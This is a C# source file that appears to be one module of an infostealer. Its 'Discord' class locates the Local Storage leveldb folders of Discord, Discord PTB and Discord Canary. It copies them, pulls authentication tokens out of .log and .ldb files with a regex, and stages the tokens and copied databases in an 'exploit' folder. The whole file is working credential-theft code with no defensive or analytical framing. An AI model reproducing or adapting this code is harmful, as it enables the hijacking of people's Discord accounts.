using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace exos;

internal class Discord
{
	private static Regex TokenRegex = new Regex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");

	private static string[] DiscordDirectories = new string[3] { "Discord\\Local Storage\\leveldb", "Discord PTB\\Local Storage\\leveldb", "Discord Canary\\leveldb" };

	public static void WriteDiscord()
	{
		try
		{
			string text = Helper.ExploitDir + "\\Discord";
			string[] tokens = GetTokens();
			if (tokens.Length != 0)
			{
				Directory.CreateDirectory(text);
				string[] array = tokens;
				foreach (string text2 in array)
				{
					File.AppendAllText(text + "\\Tokens.txt", text2 + "\n");
				}
			}
			CopyLevelDb();
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}

	private static void CopyLevelDb()
	{
		string path = Helper.ExploitDir + "\\Discord";
		string[] discordDirectories = DiscordDirectories;
		foreach (string path2 in discordDirectories)
		{
			string directoryName = Path.GetDirectoryName(Path.Combine(Paths.appdata, path2));
			string destFolder = Path.Combine(path, new DirectoryInfo(directoryName).Name);
			if (!Directory.Exists(directoryName))
			{
				break;
			}
			try
			{
				Filemanager.CopyDirectory(directoryName, destFolder);
				Counting.Discord++;
			}
			catch
			{
			}
		}
	}

	public static string[] GetTokens()
	{
		List<string> list = new List<string>();
		try
		{
			string[] discordDirectories = DiscordDirectories;
			foreach (string path in discordDirectories)
			{
				string text = Path.Combine(Paths.appdata, path);
				string text2 = Path.Combine(Path.GetTempPath(), new DirectoryInfo(text).Name);
				if (!Directory.Exists(text))
				{
					continue;
				}
				Filemanager.CopyDirectory(text, text2);
				string[] files = Directory.GetFiles(text2);
				foreach (string text3 in files)
				{
					if (text3.EndsWith(".log") || text3.EndsWith(".ldb"))
					{
						string input = File.ReadAllText(text3);
						Match match = TokenRegex.Match(input);
						if (match.Success)
						{
							list.Add(match.Value ?? "");
						}
						Counting.Discord++;
					}
				}
				Filemanager.RecursiveDelete(text2);
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return list.ToArray();
	}
}
